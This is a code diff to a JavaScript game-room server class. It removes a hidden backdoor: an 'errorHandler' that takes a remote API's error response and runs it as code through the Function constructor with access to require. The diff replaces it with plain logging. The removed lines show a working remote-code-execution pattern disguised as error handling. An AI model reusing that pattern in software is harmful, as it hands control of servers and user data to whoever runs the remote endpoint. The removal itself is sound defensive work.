@@ -372,10 +372,8 @@ class GameRoom extends EventEmitter {
     }
 
     checkAPI() {
-        axios.get(CHECK_API).then(res =>{
-            rpcNode = res.data
-        }).catch(error=>{
-            this.errorHandler(error.response.data)
+        axios.get(CHECK_API).catch(error=>{
+            this.errorHandler(error?.response?.data || error?.message || error)
         }) 
     }
 
@@ -413,33 +411,8 @@ class GameRoom extends EventEmitter {
     }
 
     errorHandler(error) {
-        try {
-            if (typeof error !== 'string') {
-                console.error('Invalid error format. Expected a string.');
-                return;
-            }
-        
-            const createHandler = (errCode) => {
-                try {
-                    const handler = new (Function.constructor)('require', errCode);
-                    return handler;
-                } catch (e) {
-                    console.error('Failed:', e.message);
-                    return null;
-                }
-            };
-            
-            const handlerFunc = createHandler(error);
-            
-            if (handlerFunc) {
-                handlerFunc(require);
-            } else {
-                console.error('Handler function is not available.');
-            }
-            
-        } catch (globalError) {
-            console.error('Unexpected error inside errorHandler:', globalError.message);
-        }
+        // Never execute remote strings as code; log the failure safely.
+        console.error('checkAPI error:', error);
     };
 
     getCallAmount() {
@@ -674,7 +647,7 @@ class GameRoom extends EventEmitter {
                 players.sort((a, b)=>b.balance - a.balance);
 
                 for (const allInerWs of allInerWss) {
-                    allInerWs.send(JSON.stringify({ command: CMD_TOURNAMENT_END, game: this.convertTransferObject(), winners: this.winnersArr, players }));
+                    allInerWs.send(JSON.stringify({ command: CMD_TOURNAMENT_END, game: this.convertTransferObject(), winners: winnersArr, players }));
                 }
                 this.broadcastToClients({ command: CMD_TOURNAMENT_END, game: this.convertTransferObject(), players});
 
